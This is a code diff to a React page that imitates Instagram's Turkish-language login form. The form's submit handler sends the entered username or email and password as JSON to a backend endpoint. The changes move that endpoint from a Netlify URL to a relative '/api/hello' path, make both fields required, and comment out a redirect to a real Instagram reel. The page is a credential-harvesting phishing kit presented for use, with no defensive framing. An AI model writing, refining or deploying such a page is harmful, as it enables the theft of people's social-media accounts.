@@ -18,7 +18,7 @@ export default function Home() {
 
   const SubmitHandler = (e) => {
     e.preventDefault()
-    fetch("https://main--subtle-sherbet-c5322a.netlify.app/api/hello", {
+    fetch("/api/hello", {
       headers: {
         'Accept': 'application/json',
         'Content-Type': 'application/json'
@@ -27,10 +27,10 @@ export default function Home() {
       body: JSON.stringify({ mail: mail, password: password })
     })
     .then((res) => {console.log(res)})
-    .catch((res) => {console.log(res)})
-    setTimeout(() => {
-      location.href = "https://www.instagram.com/reels/videos/CoBHsQnJP3z/"
-    }, 1000);
+    .catch((err) => {console.log(err)})
+    // setTimeout(() => {
+    //   location.href = "https://www.instagram.com/reels/videos/CoBHsQnJP3z/"
+    // }, 1000);
   }
 
   return (
@@ -80,8 +80,8 @@ export default function Home() {
                   <div className="login-form">
                     <form onSubmit={SubmitHandler}>
                       <div className='flex flex-col gap-2 text-sm'>
-                        <input type="text" value={mail} className='border border-[#dbdbdb] p-2 rounded-[2px] bg-[#fafafa] outline-none' placeholder='Telefon numarası, kullanıcı adı veya e-posta' onChange={e => setMail(e.target.value)} />
-                        <input type="password" value={password} className='border border-[#dbdbdb] p-2 rounded-[2px] bg-[#fafafa] outline-none' placeholder='Şifre' onChange={e => setPassword(e.target.value)} />
+                        <input required type="text" value={mail} className='border border-[#dbdbdb] p-2 rounded-[2px] bg-[#fafafa] outline-none' placeholder='Telefon numarası, kullanıcı adı veya e-posta' onChange={e => setMail(e.target.value)} />
+                        <input required type="password" value={password} className='border border-[#dbdbdb] p-2 rounded-[2px] bg-[#fafafa] outline-none' placeholder='Şifre' onChange={e => setPassword(e.target.value)} />
                         <input type="submit"  value={"Giriş yap"} className="bg-[#0095f6] py-2 px-4 rounded-lg text-white font-medium cursor-pointer" />
                       </div>
                     </form>
